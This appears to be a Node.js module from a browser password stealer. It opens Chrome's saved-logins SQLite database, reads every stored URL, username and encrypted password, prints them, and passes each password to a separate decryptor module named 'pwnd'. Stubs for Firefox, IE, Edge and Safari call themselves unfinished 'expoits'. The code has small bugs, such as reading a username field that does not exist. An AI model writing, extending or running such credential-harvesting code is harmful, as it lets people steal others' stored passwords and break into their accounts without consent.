const s = require('sqlite3').verbose(),
	pwnd = require("./decryptor"),
	check = require("./system_check/sys_check");

const chrome = (async () => {
			try {
				let db = await s.Database((new check().win32("chrome"), (e) => {
					if (e) return console.error(e);
					return console.log('Connected to Database');
				}));

				db.serialize(async () => {
					db.each(
						"SELECT action_url, username_value, password_value FROM logins",
						async (e, row) => {
							if (e) return console.error(e);
							return console.log(`URL: ${row.action_url}`),
							console.log(`Username: ${row.username}`),
							console.log('Password Cipher: ' + row.password_value),

							console.time(),
							// run func to decrypt.
							enc = row.password_value,
							enc = await pwnd.fndEnc(enc),
							await pwnd.decrypt(enc);
						}
					);
				});
			} catch (e) {
				return console.error(e);
			}
	}),
	firefox = (async () => {
		return console.log("Firefox expoit not ready yet!");
	}),
	ie = (async () => {
		return console.log("IE expoit not ready yet!");
	}),
	edge = (async () => {
		return console.log("Edge expoit not ready yet!");
	}),
	safari = (async () => {
		return console.log("Safari expoit not ready yet!");
	});

module.exports = {
	chrome: chrome,
	firefox: firefox,
	ie: ie,
	edge: edge,
	safari: safari
};
